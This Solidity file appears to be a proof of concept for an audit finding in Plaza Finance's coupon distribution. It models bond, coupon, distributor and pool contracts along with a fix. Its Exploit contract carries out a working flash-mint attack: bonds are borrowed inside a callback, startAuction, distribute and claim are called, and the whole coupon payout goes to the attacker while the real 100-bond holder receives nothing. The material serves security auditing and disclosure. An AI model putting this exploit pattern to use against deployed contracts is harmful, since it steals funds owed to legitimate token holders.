// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Plaza Finance coupon distribution — Sherlock 2024-12, issue 725.
    startAuction is permissionless and indexes the caller's live bond balance.
    A flash mint of 1000 bonds, taken before startAuction, is credited for the
    whole 1000 coupon reward. The existing 100-bond holder is paid 0.
    Snapshotting the pre-mint balance pays that holder and pays the attacker 0.
*/

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BondToken {
    uint256 public constant SHARES_DECIMALS = 18;
    uint256 public currentPeriod;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => uint256) public sharesPerTokenAt;

    struct IndexedUserAssets {
        uint256 indexedAmountShares;
        uint256 lastUpdatedPeriod;
    }

    mapping(address => IndexedUserAssets) public userAssets;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        if (balanceOf[to] == amount) {
            userAssets[to].lastUpdatedPeriod = currentPeriod;
        }
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
    }

    function globalPool() external view returns (uint256 period, uint256) {
        return (currentPeriod, 0);
    }

    function increaseIndexedAssetPeriod(uint256 sharesPerToken) external {
        sharesPerTokenAt[currentPeriod] = sharesPerToken;
        currentPeriod += 1;
    }

    function markUpdated(address user, uint256 period) external {
        userAssets[user].lastUpdatedPeriod = period;
        userAssets[user].indexedAmountShares = 0;
    }

    function getIndexedUserAmount(address user, uint256 balance, uint256 period) public view returns (uint256) {
        IndexedUserAssets memory userPool = userAssets[user];
        uint256 shares = userPool.indexedAmountShares;

        for (uint256 i = userPool.lastUpdatedPeriod; i < period; i++) {
            // @> VULN: the live bond balance is indexed for the period, so a same-transaction flash mint is paid
            shares += (balance * sharesPerTokenAt[i]) / (10 ** SHARES_DECIMALS);
        }

        return shares;
    }
}

contract Distributor {
    Erc20 public coupon;
    BondToken public bond;

    constructor(Erc20 c, BondToken b) {
        coupon = c;
        bond = b;
    }

    function claim(address user) external returns (uint256 paid) {
        uint256 period = bond.currentPeriod();
        uint256 shares = bond.getIndexedUserAmount(user, bond.balanceOf(user), period);
        bond.markUpdated(user, period);
        uint256 bal = coupon.balanceOf(address(this));
        paid = shares > bal ? bal : shares;
        if (paid > 0) require(coupon.transfer(user, paid), "pay");
    }
}

contract Pool {
    BondToken public bondToken;
    Erc20 public coupon;
    Distributor public distributor;
    uint256 public lastDistribution;
    uint256 public distributionPeriod;
    uint256 public auctionPeriod;
    uint256 public sharesPerToken;
    uint256 public couponAmountToDistribute;

    constructor(BondToken bond_, Erc20 coupon_, Distributor dist_, uint256 spt, uint256 coupons) {
        bondToken = bond_;
        coupon = coupon_;
        distributor = dist_;
        sharesPerToken = spt;
        couponAmountToDistribute = coupons;
        distributionPeriod = 0;
        auctionPeriod = 7 days;
    }

    function startAuction() external {
        require(lastDistribution + distributionPeriod < block.timestamp, "DistributionPeriodNotPassed");
        require(lastDistribution + distributionPeriod + auctionPeriod >= block.timestamp, "AuctionPeriodPassed");
        bondToken.increaseIndexedAssetPeriod(sharesPerToken);
        lastDistribution = block.timestamp;
    }

    function distribute() external {
        (uint256 currentPeriod,) = bondToken.globalPool();
        require(currentPeriod > 0, "AccessDenied");
        require(coupon.transfer(address(distributor), couponAmountToDistribute), "fund");
    }
}

contract PoolFixed {
    BondToken public bondToken;
    Erc20 public coupon;
    Distributor public distributor;
    uint256 public sharesPerToken;
    uint256 public couponAmountToDistribute;
    mapping(address => uint256) public snapshotBalance;

    constructor(BondToken bond_, Erc20 coupon_, Distributor dist_, uint256 spt, uint256 coupons) {
        bondToken = bond_;
        coupon = coupon_;
        distributor = dist_;
        sharesPerToken = spt;
        couponAmountToDistribute = coupons;
    }

    function snapshot(address user) external {
        snapshotBalance[user] = bondToken.balanceOf(user);
    }

    function startAuction() external {
        bondToken.increaseIndexedAssetPeriod(sharesPerToken);
    }

    function distribute() external {
        require(coupon.transfer(address(distributor), couponAmountToDistribute), "fund");
    }

    function claimFromSnapshot(address user) external returns (uint256 paid) {
        uint256 shares = snapshotBalance[user] * sharesPerToken / 1e18;
        uint256 bal = coupon.balanceOf(address(this));
        paid = shares > bal ? bal : shares;
        if (paid > 0) require(coupon.transfer(user, paid), "pay");
    }
}

contract FlashBond {
    BondToken public bond;

    constructor(BondToken b) {
        bond = b;
    }

    function loan(address borrower, uint256 amount, bytes calldata data) external {
        bond.mint(borrower, amount);
        (bool ok,) = borrower.call(data);
        require(ok, "callback");
        require(bond.balanceOf(borrower) == 0, "not repaid");
    }
}

contract Exploit {
    uint256 public constant COUPONS = 1000 ether;
    uint256 public constant SHARES_PER_TOKEN = 1e18;
    uint256 public constant VICTIM_BONDS = 100 ether;

    BondToken public bond;
    Erc20 public coupon;
    Distributor public distributor;
    Pool public pool;
    FlashBond public flash;
    address public victim;
    uint256 public attackerCoupons;
    uint256 public victimCoupons;

    constructor() {
        bond = new BondToken();
        coupon = new Erc20("COUPON");
        distributor = new Distributor(coupon, bond);
        pool = new Pool(bond, coupon, distributor, SHARES_PER_TOKEN, COUPONS);
        flash = new FlashBond(bond);
        victim = address(0xBEEF);
        bond.mint(victim, VICTIM_BONDS);
        coupon.mint(address(pool), COUPONS);
    }

    function run() external {
        uint256 mintAmt = COUPONS * 1e18 / SHARES_PER_TOKEN;
        flash.loan(address(this), mintAmt, abi.encodeWithSelector(this.onFlashLoan.selector, mintAmt));
        attackerCoupons = coupon.balanceOf(address(this));
        victimCoupons = distributor.claim(victim);
        require(attackerCoupons == COUPONS, "attacker took every coupon");
        require(victimCoupons == 0, "existing holder was paid nothing");
        require(bond.balanceOf(address(this)) == 0, "flash bonds repaid");
        require(bond.balanceOf(victim) == VICTIM_BONDS, "victim still holds bonds");
        require(coupon.balanceOf(address(distributor)) == 0, "distributor empty");
    }

    function onFlashLoan(uint256 amount) external {
        require(msg.sender == address(flash), "flash");
        pool.startAuction();
        pool.distribute();
        uint256 paid = distributor.claim(address(this));
        require(paid == COUPONS, "claimed the full distribution");
        bond.burn(address(this), amount);
    }
}
